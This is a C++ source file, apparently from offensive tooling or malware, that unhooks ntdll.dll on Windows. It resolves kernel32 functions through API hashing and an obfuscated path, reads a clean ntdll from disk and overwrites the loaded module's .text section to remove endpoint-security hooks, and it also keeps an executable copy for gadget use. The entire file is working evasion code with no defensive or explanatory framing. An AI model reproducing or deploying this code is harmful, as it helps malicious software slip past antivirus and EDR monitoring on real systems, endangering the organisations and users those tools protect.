#include "Unhook.h"
#include "ApiHash.h"
#include "Strings.h"

#include <windows.h>

#include <vector>

namespace unhook {

namespace {

std::uint8_t* g_clean_text = nullptr;
std::size_t    g_clean_size = 0;
void*          g_loaded_base = nullptr;
std::uint32_t  g_text_rva = 0;
std::uint32_t  g_text_size = 0;
bool           g_restored = false;

struct Kernel32 {
    HANDLE(WINAPI* CreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
        DWORD, DWORD, HANDLE);
    BOOL(WINAPI* ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    DWORD(WINAPI* GetFileSize)(HANDLE, LPDWORD);
    BOOL(WINAPI* CloseHandle)(HANDLE);
    BOOL(WINAPI* VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    LPVOID(WINAPI* VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    HMODULE(WINAPI* GetModuleHandleW)(LPCWSTR);
};

Kernel32 resolve_kernel32() {
    constexpr std::uint32_t k32 = API_HASH("kernel32.dll");
    Kernel32 k{};
    k.CreateFileW = api::resolve<decltype(&::CreateFileW)>(k32, API_HASH("CreateFileW"));
    k.ReadFile = api::resolve<decltype(&::ReadFile)>(k32, API_HASH("ReadFile"));
    k.GetFileSize = api::resolve<decltype(&::GetFileSize)>(k32, API_HASH("GetFileSize"));
    k.CloseHandle = api::resolve<decltype(&::CloseHandle)>(k32, API_HASH("CloseHandle"));
    k.VirtualProtect = api::resolve<decltype(&::VirtualProtect)>(k32, API_HASH("VirtualProtect"));
    k.VirtualAlloc = api::resolve<decltype(&::VirtualAlloc)>(k32, API_HASH("VirtualAlloc"));
    k.GetModuleHandleW = api::resolve<decltype(&::GetModuleHandleW)>(k32, API_HASH("GetModuleHandleW"));
    return k;
}

bool find_text(void* base, std::uint32_t& rva, std::uint32_t& size) {
    auto b = reinterpret_cast<std::uint8_t*>(base);
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(b);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(b + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    auto sect = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sect[i].Name, ".text", 5) == 0) {
            rva = sect[i].VirtualAddress;
            size = sect[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

bool find_text_raw(std::uint8_t* file, std::uint8_t*& raw, std::uint32_t& size) {
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(file);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(file + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    auto sect = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sect[i].Name, ".text", 5) == 0) {
            raw = file + sect[i].PointerToRawData;
            size = sect[i].SizeOfRawData;
            return true;
        }
    }
    return false;
}

} // namespace

bool bind_ntdll() {
    if (g_clean_text && g_loaded_base) return true;

    auto k = resolve_kernel32();
    if (!k.VirtualAlloc) return false;

    g_loaded_base = api::module_by_hash(API_HASH("ntdll.dll"));
    if (!g_loaded_base) return false;

    if (!find_text(g_loaded_base, g_text_rva, g_text_size)) return false;

    auto ntdll_path = OBF_KEEP("C:\\Windows\\System32\\ntdll.dll");
    wchar_t wpath[64] = {};
    for (std::size_t i = 0; i < ntdll_path.size() && i + 1 < 64; ++i)
        wpath[i] = static_cast<wchar_t>(static_cast<unsigned char>(ntdll_path.c_str()[i]));
    HANDLE h = k.CreateFileW(wpath,
        GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    DWORD fs = k.GetFileSize(h, nullptr);
    if (fs == INVALID_FILE_SIZE || fs == 0) { k.CloseHandle(h); return false; }

    std::vector<std::uint8_t> file(fs);
    DWORD got = 0;
    if (!k.ReadFile(h, file.data(), fs, &got, nullptr) || got != fs) {
        k.CloseHandle(h);
        return false;
    }
    k.CloseHandle(h);

    std::uint8_t* clean_raw = nullptr;
    std::uint32_t clean_raw_size = 0;
    if (!find_text_raw(file.data(), clean_raw, clean_raw_size)) return false;

    g_clean_text = static_cast<std::uint8_t*>(
        k.VirtualAlloc(nullptr, clean_raw_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!g_clean_text) return false;
    memcpy(g_clean_text, clean_raw, clean_raw_size);
    g_clean_size = clean_raw_size;
    // RX so a gadget pointer into this copy is executable if ever used.
    DWORD oldp = 0;
    k.VirtualProtect(g_clean_text, clean_raw_size, PAGE_EXECUTE_READ, &oldp);
    return true;
}

bool restore_ntdll_text() {
    if (g_restored) return true;
    if (!bind_ntdll()) return false;

    auto k = resolve_kernel32();
    if (!k.VirtualProtect || !g_clean_text || !g_loaded_base) return false;

    DWORD oldp = 0;
    void* dst = reinterpret_cast<std::uint8_t*>(g_loaded_base) + g_text_rva;
    if (!k.VirtualProtect(dst, g_text_size, PAGE_EXECUTE_READWRITE, &oldp)) return false;
    memcpy(dst, g_clean_text,
           (g_clean_size < g_text_size) ? g_clean_size : g_text_size);
    DWORD tmp = 0;
    k.VirtualProtect(dst, g_text_size, oldp, &tmp);
    g_restored = true;
    return true;
}

bool unhook_ntdll() {
    if (!bind_ntdll()) return false;
    return restore_ntdll_text();
}

const std::uint8_t* clean_text() { return g_clean_text; }
std::size_t clean_text_size() { return g_clean_size; }
void* loaded_ntdll_base() { return g_loaded_base; }

} // namespace unhook
